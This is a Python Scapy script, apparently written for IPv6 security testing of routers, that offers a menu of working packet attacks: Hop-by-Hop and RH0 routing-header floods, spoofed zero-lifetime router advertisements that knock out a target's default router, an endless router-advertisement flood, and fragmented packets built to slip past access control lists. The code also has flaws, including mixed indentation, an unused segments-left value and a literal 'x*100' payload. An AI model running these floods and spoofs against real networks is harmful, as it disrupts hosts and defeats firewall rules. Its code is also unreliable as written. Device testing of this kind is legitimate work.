#! /usr/bin/env python

##   Version 0.3

#############################################################################
##                                                                         ##
## ipv6-test.py --- test script for IPv6 security unit testing             ##
##                                                                         ##
## This tools requires installation of Scapy which can be found here:      ##
## http://www.secdev.org/projects/scapy/                                   ##
## 																		   ##	
## Copyright (C) 2012  Keith O'Brien   keith at keithobrien dot org        ##
##                                                                         ##
## This program is free software; you can redistribute it and/or modify it ##
## under the terms of the GNU General Public License as published by the   ##
## Free Software Foundation; either version 2, or (at your option) any     ##
## later version.                                                          ##
##                                                                         ##
## This program is distributed in the hope that it will be useful, but     ##
## WITHOUT ANY WARRANTY; without even the implied warranty of              ##
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU       ##
## General Public License for more details.                                ##
##                                                                         ##
#############################################################################


import sys
import random
from random import randint
from scapy.all import *


def randomacaddr():
	return ':'.join(map(lambda x: "%02x" % x, [ 0x00, 0x16, 0x3e,randint(0x00, 0x7f),randint(0x00, 0xff),randint(0x00, 0xff) ]))


def hbh_flood(psrc = '::1', pdst = '::1', psport = 1055, pdport = 53, ppayload = 'x'*100, pnumpkts = 1000):
    #Send defaults above unless entered by user
	pkt = IPv6(src = psrc, dst = pdst)/IPv6ExtHdrHopByHop()/UDP(sport = psport, dport = pdport)/ppayload
    pkt.show()
	send(pkt, count = pnumpkts)


def routing_header(router_address = '5::5', psrc = '::1', pdst = '::1', psport = 1055, pdport = 53, segleft=0, pnumpkts = 1000):
	#Send defaults above unless entered by user	
	pkt = IPv6(src = psrc, dst = pdst)/IPv6ExtHdrRouting(addresses = ['6::6', router_address])/UDP(sport = psport, dport = pdport)
	pkt.show()	
	send(pkt, count = pnumpkts)

def multi_routing_header():
	### Create IPv6 Packet
	ip6 = IPv6()
	ip6.dst=raw_input("Destination IPv6 Address: ")
	ip6.src=raw_input("Source IPv6 Address: ")
	ip6.nh=43	
	### Create Hop by Hop header 1
	rh0=IPv6ExtHdrRouting(addresses=['5::5', '6::6'])
	rh0.nh=43
	### Create Hop by Hop header 2
	rh1=IPv6ExtHdrRouting(addresses=['5::5', '6::6'])
	rh1.nh=17
	### Create UDP Header
	udp=UDP()
	udp.sport=1055
	udp.dport=53
	udp.len=100
	### Create Payload
	payload=('x'*100)
	### Create Packet for sending
	pkt=ip6/rh0/rh1/udp/payload
	pkt.show()
	numpackets = raw_input("Number of packets: ")
	send(pkt, count=int(numpackets))
	return()

def kill_ra():
	### Create Spoofed IPv6 RA pointing at the target
	ip6 = IPv6()
	ip6.src = raw_input("Enter IPv6 Address of the target machine: ")
	ip6.nh=58	
	### Create ICMPv6 RA with 0 lifetime 
	ra = ICMPv6ND_RA(routerlifetime=0)
	### Create Packet for sending
	pkt=ip6/ra
	pkt.show()
	numpackets = raw_input("Number of packets: ")
	send(pkt, count=int(numpackets))
	return()

def flood_ra():
	
	pkt = Ether()/IPv6()/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefix= RandIP6("2001:CAFE:*::"),prefixlen=64) \
	/ICMPv6NDOptSrcLLAddr(lladdr=randomacaddr())
	sendp(pkt,loop=1)
	#return()

def tcp_fragment():
	### Create Payloads
	payload1 = ''
	for i in range(1280):
		payload1 = payload1 + 'A'
	payload2 = ''
	for i in range(1280):
		payload2 = payload2 + 'B'
	### Create IPv6 Packet
	ip6 = IPv6()
	ip6.dst = raw_input("Destination IPv6 Address: ")
	ip6.src = raw_input("Source IPv6 Address: ")
	### Create ICMPv6 Packet
	icmpv6 = ICMPv6EchoRequest(cksum=0x7b57, data=payload1)
	#Create Fragments
	frag1=IPv6ExtHdrFragment(offset=0, m=1, id=511, nh=58)
	frag2=IPv6ExtHdrFragment(offset=162, m=0, id=511, nh=6)	
	### Create TCP Header
	tcp=TCP()
	tcp.sport=1055
	tcp.dport=8080
	### Create Packet for sending
	pkt1=ip6/frag1/icmpv6
	pkt2=ip6/frag2/tcp/payload2
	pkt1.show()
	pkt2.show()
	#Send Packets
	send(pkt1)
	send(pkt2)
	return()


print('1. Send HbH Header Flood')
print('2. Send RH0 Packets')
print('3. Send Packets with two RH0 Headers')
print('4. RA deamon killer')
print('5. RA Flood')
print('6. Hide Layer 4 Info for ACL Bypass') 
choice = raw_input('? ')

if "1" in choice:
	psrc = raw_input("Enter source IPv6 address: ")
	pdst = raw_input("Enter destination IPv6 address.  Be sure that the destination is not the device under test.  The device under test \
	has to be a layer 3 hop between the source and destination IPv6 address in order to test CPU impact: ")
	psport = input("Enter source UDP port: ")
	pdport = input("Enter destination UDP port: ")
	pnumpkts = input("Enter number of packets: ")
	
	hbh_flood(psrc, pdst, psport, pdport, 'x*100', pnumpkts)
	
if "2" in choice:
	psrc = raw_input("Enter source IPv6 address: ")
	print "Enter destination IPv6 address.  Be sure that the destination is not the device under test."
	pdst = raw_input("The device under test has to be a layer 3 hop between the source and destination IPv6 address in order to test CPU impact: ")
	psport = input("Enter source UDP port: ")
	pdport = input("Enter destination UDP port: ")
	router_address = raw_input("Enter address of the router under test. This address will be listed as a hop to visit in the RH: ")
	print "Enter the number of segments left.  If Segments Left is zero the unit under test should ignore the RH and proceed to process the next header"
	segleft = input("If the segments left is non-zero the unit under test should discard the RH and send an ICMP parameter program Code 0 to the source address")
	pnumpkts = input("Enter number of packets: ")    	
	routing_header(router_address, psrc, pdst, psport, pdport, segleft, pnumpkts) 


if "3" in choice:
    	multi_routing_header() 

if "4" in choice:
	kill_ra()

if "5" in choice:
	flood_ra()	
	
if "6" in choice:
	tcp_fragment()